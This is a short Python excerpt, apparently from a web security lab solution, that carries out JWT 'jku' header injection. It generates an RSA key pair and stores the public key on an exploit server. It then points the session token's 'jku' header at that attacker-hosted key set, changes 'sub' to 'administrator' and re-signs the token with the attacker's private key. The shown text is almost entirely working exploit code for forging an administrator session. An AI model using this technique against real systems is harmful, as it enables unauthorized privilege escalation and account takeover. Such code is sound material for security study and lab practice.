...
def jwt_jku_injection(s, exploit_url, exploit_path, filePath):
    private_key, public_key = generate_rsa_keys()
    send_vuln_payload(s, exploit_url, exploit_path, filePath, json.dumps(to_jku(public_key)), 'STORE')
    token = s.cookies['session']
    header_json, payload_json, _ = decode_jwt(token)
    header_json['alg'] = 'RS256'
    header_json['jku'] = f'{exploit_url}{filePath}'
    header_json['kid'] = "attacker's key"
    payload_json['sub'] = 'administrator'
    new_token = sign_jwt(header_json, payload_json, private_key)
...
def main():
    ...
    jwt_jku_injection(s, exploit_url, '/', '/exploit')
